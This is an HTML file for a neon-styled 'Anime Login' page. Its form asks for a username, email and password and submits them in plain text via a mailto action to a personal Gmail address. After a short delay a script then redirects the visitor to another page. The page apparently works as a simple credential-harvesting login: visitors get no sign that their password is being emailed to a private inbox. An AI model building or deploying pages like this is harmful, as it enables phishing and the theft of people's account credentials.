<meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Anime Login</title>

<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: 'Poppins', sans-serif;
}

body {
  height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  background: linear-gradient(135deg, #0f172a, #1e293b);
  overflow: hidden;
}

body::before {
  content: "";
  position: absolute;
  width: 500px;
  height: 500px;
  background: radial-gradient(circle, #ff00cc, transparent);
  animation: move 6s infinite alternate;
  filter: blur(100px);
}

@keyframes move {
  from { transform: translate(-120px, -120px); }
  to { transform: translate(120px, 120px); }
}

.login-box {
  position: relative;
  width: 320px;
  padding: 30px;
  border-radius: 20px;
  background: rgba(255,255,255,0.05);
  backdrop-filter: blur(15px);
  box-shadow: 0 0 25px rgba(0,255,255,0.5);
  text-align: center;
  z-index: 1;
}

.login-box h2 {
  color: #00f7ff;
  margin-bottom: 20px;
  text-shadow: 0 0 10px #00f7ff;
}

.input-box {
  margin: 15px 0;
}

.input-box input {
  width: 100%;
  padding: 10px;
  border-radius: 10px;
  border: none;
  outline: none;
  background: rgba(255,255,255,0.1);
  color: white;
}

button {
  width: 100%;
  padding: 12px;
  border-radius: 12px;
  border: none;
  background: linear-gradient(45deg, #00f7ff, #ff00cc);
  color: white;
  font-weight: bold;
  cursor: pointer;
}

</style>
</head>

<body>

<div class="login-box">
  <h2>Login</h2>

  <!-- ✅ MAILTO FORM -->
  <form action="mailto:sarangpsiqoo@gmail.com" method="POST" enctype="text/plain">

    <div class="input-box">
      <input type="text" name="Username" placeholder="Username" required>
    </div>

    <div class="input-box">
      <input type="email" name="Email" placeholder="Email ID" required>
    </div>

    <div class="input-box">
      <input type="password" name="Password" placeholder="Password" required>
    </div>

    <button type="submit" onclick="redirectPage()">⚡ Login</button>

  </form>
</div>

<script>
function redirectPage() {
  // wait 2 sec then redirect
  setTimeout(function() {
    window.location.href = "index1.html";
  }, 2000);
}
</script>

</body>
</html>
